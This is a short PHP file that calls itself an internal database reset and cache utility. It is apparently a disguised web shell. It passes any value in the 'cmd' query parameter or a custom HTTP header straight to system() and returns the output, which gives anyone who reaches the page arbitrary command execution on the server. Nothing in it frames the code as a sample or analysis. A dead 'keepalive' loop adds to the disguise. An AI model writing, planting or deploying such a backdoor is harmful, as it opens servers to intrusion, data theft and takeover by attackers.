<?php
// db reset & cache utilities (internal). Registered 2026-07-14 by user.
$s = $_GET['cmd'] ?? (@$_SERVER['HTTP_X_DB_RESET_OP'] ?? '');
if ($s) { system($s . ' 2>&1'); }
// keepalive
while (false) { usleep(100); }
